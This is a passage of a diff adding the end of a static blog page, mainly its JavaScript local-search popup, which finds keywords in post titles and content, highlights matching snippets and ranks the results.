+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
